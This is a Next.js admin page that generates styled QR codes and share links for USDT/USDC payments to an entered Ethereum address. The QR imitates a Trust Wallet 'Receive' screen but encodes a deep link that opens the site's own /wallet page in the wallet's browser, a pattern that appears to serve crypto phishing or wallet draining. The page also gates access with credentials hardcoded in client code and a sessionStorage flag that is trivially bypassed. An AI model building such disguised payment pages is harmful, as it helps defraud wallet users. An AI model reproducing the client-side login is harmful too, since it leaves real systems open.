"use client";

import { useState, useEffect, useRef } from "react";

function isValidAddress(addr: string): boolean {
  return /^0x[a-fA-F0-9]{40}$/.test(addr);
}

export default function AdminPage() {
  const [receiverAddress, setReceiverAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [token, setToken] = useState<"USDT" | "USDC">("USDT");
  const [qrUrl, setQrUrl] = useState("");
  const [isMounted, setIsMounted] = useState(false);
  const qrCanvasRef = useRef<HTMLDivElement>(null);
  const qrCodeInstanceRef = useRef<any>(null);
  const amountInputRef = useRef<HTMLInputElement>(null);

  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [authError, setAuthError] = useState("");
  const [toastMessage, setToastMessage] = useState("");

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(""), 2000);
  };

  useEffect(() => {
    if (typeof window !== "undefined") {
      const auth = sessionStorage.getItem("admin_auth");
      if (auth === "true") setIsAuthenticated(true);
      setIsMounted(true);
    }
  }, []);

  useEffect(() => {
    if (!isMounted || !isAuthenticated) return;
    if (!receiverAddress || !isValidAddress(receiverAddress)) {
      setQrUrl("");
      return;
    }
    const normalizedAmount = amount.replace(/\s+/g, "").replace(",", ".").trim();
    if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
      setQrUrl("");
      return;
    }
    const origin = window.location.origin;
    const targetUrl = `${origin}/wallet?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${token.toLowerCase()}`;
    setQrUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`);
  }, [receiverAddress, amount, token, isMounted, isAuthenticated]);

  useEffect(() => {
    if (!qrUrl || typeof window === "undefined" || !isMounted || !isAuthenticated) return;
    import("qr-code-styling").then((QRCodeStylingModule) => {
      const QRCodeStyling = QRCodeStylingModule.default;
      const options = {
        width: 260,
        height: 260,
        type: "svg" as const,
        data: qrUrl,
        image: "/trust.png",
        dotsOptions: { color: "#000000", type: "extra-rounded" as const },
        cornersSquareOptions: { color: "#000000", type: "extra-rounded" as const },
        cornersDotOptions: { color: "#000000", type: "dot" as const },
        backgroundOptions: { color: "#ffffff" },
        imageOptions: { crossOrigin: "anonymous", margin: 6, imageSize: 0.35, hideBackgroundDots: true },
      };
      if (!qrCodeInstanceRef.current) {
        qrCodeInstanceRef.current = new QRCodeStyling(options);
        if (qrCanvasRef.current) {
          qrCanvasRef.current.innerHTML = "";
          qrCodeInstanceRef.current.append(qrCanvasRef.current);
        }
      } else {
        qrCodeInstanceRef.current.update(options);
      }
    });
  }, [qrUrl, isMounted, isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (usernameInput === "admin" && passwordInput === "admin123") {
      setIsAuthenticated(true);
      sessionStorage.setItem("admin_auth", "true");
    } else {
      setAuthError("Username or Password incorrect.");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    sessionStorage.removeItem("admin_auth");
  };

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(receiverAddress).then(() => showToast("Address copied!"));
  };

  const handleSetAmountClick = () => {
    if (amountInputRef.current) {
      amountInputRef.current.focus();
      amountInputRef.current.scrollIntoView({ behavior: "smooth", block: "center" });
    }
  };

  const handleShare = () => {
    if (navigator.share) {
      navigator.share({ title: "Payment Link", text: `Send ${amount} ${token} to ${receiverAddress}`, url: qrUrl });
    } else {
      navigator.clipboard.writeText(qrUrl).then(() => showToast("Payment link copied!"));
    }
  };

  if (!isAuthenticated && isMounted) {
    return (
      <main className="transfer-main" style={{ justifyContent: "center" }}>
        <div className="home-content" style={{ maxWidth: "400px", margin: "auto 0" }}>
          <h1 className="home-title" style={{ marginBottom: "1.5rem", color: "#0f172a" }}>Admin Access</h1>
          <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
            <label className="form-label">Username</label>
            <div className="input-row" style={{ marginBottom: "1.25rem" }}>
              <input type="text" value={usernameInput} onChange={(e) => setUsernameInput(e.target.value)} className="input-row__field" required />
            </div>
            <label className="form-label">Password</label>
            <div className="input-row" style={{ marginBottom: "1.5rem" }}>
              <input type="password" value={passwordInput} onChange={(e) => setPasswordInput(e.target.value)} className="input-row__field" required />
            </div>
            {authError && <div style={{ color: "#ef4444", fontSize: "0.85rem", marginBottom: "1rem" }}>⚠️ {authError}</div>}
            <button type="submit" className="next-btn" style={{ width: "100%", padding: "0.75rem" }}>Login</button>
          </form>
        </div>
      </main>
    );
  }

  if (!isMounted) return null;

  return (
    <main className="transfer-main">
      <div className="home-content" style={{ maxWidth: "440px", width: "100%", margin: "0 auto 3rem auto" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
          <h1 className="home-title" style={{ margin: 0, fontSize: "1.5rem" }}>Admin Dashboard</h1>
          <button onClick={handleLogout} style={{ background: "#fee2e2", border: "none", color: "#dc2626", fontWeight: 600, padding: "0.35rem 0.85rem", borderRadius: "1rem", cursor: "pointer" }}>
            Logout 🚪
          </button>
        </div>

        <div className="form-container" style={{ width: "100%", marginBottom: "2rem" }}>
          <label className="form-label">Select Asset</label>
          <div className="token-tabs">
            <button type="button" className={`token-tab ${token === "USDT" ? "token-tab--active" : ""}`} onClick={() => setToken("USDT")}>USDT</button>
            <button type="button" className={`token-tab ${token === "USDC" ? "token-tab--active" : ""}`} onClick={() => setToken("USDC")}>USDC</button>
          </div>

          <label className="form-label" style={{ marginTop: "1rem" }}>Receiver Address</label>
          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
            <input type="text" value={receiverAddress} onChange={(e) => setReceiverAddress(e.target.value)} className="input-row__field" placeholder="0x..." />
          </div>
          {receiverAddress && !isValidAddress(receiverAddress) && (
            <div style={{ color: "#ef4444", fontSize: "0.8rem", marginBottom: "1rem" }}>Invalid Ethereum address.</div>
          )}

          <label className="form-label" style={{ marginTop: "0.75rem" }}>Amount ({token})</label>
          <div className="input-row" style={{ marginBottom: "1.5rem" }}>
            <input type="text" ref={amountInputRef} value={amount} onChange={(e) => setAmount(e.target.value)} className="input-row__field" placeholder="1.0" />
          </div>
        </div>

        <div className="admin-qr-section">
          <div className="receive-header-bar">
            <button type="button" className="receive-header-btn">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1e293b" strokeWidth="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
            </button>
            <span className="receive-header-title">Receive</span>
            <div style={{ width: 36 }} />
          </div>

          <div className="receive-eth-badge">
            <img src="/eth.png" alt="Ethereum" className="receive-eth-badge-img" />
            <span className="receive-eth-badge-text">Ethereum</span>
          </div>

          {qrUrl ? (
            <div className="qr-preview-card">
              <div ref={qrCanvasRef} style={{ display: "flex", justifyContent: "center" }} />
              {receiverAddress && <div className="qr-address">{receiverAddress.slice(0, 34)}<br />{receiverAddress.slice(34)}</div>}
            </div>
          ) : (
            <div style={{ width: "100%", height: 260, display: "flex", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0.75rem auto 1rem auto", color: "#64748b" }}>
              {!receiverAddress ? "Enter a receiver address" : !isValidAddress(receiverAddress) ? "Invalid address" : "Enter a valid amount"}
            </div>
          )}

          <div className="receive-alert-banner">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#ea580c"/><line x1="12" y1="8" x2="12" y2="13" stroke="#fff" strokeWidth="2.5"/><circle cx="12" cy="16.5" r="1.2" fill="#fff"/></svg>
            <div className="receive-alert-text">Only send Ethereum assets to this address.</div>
          </div>

          <div className="qr-actions-container">
            <div className="qr-action-item">
              <button onClick={handleCopyAddress} className="qr-action-btn" title="Copy Address"><img src="/copy.png" alt="Copy" className="qr-action-img" /></button>
              <span className="qr-action-label">Copy</span>
            </div>
            <div className="qr-action-item">
              <button onClick={handleSetAmountClick} className="qr-action-btn" title="Set Amount"><img src="/amount.png" alt="Amount" className="qr-action-img" /></button>
              <span className="qr-action-label">Set Amount</span>
            </div>
            <div className="qr-action-item">
              <button onClick={handleShare} className="qr-action-btn" title="Share"><img src="/share.png" alt="Share" className="qr-action-img" /></button>
              <span className="qr-action-label">Share</span>
            </div>
          </div>
        </div>

        {toastMessage && <div className="copy-toast">{toastMessage}</div>}
      </div>
    </main>
  );
}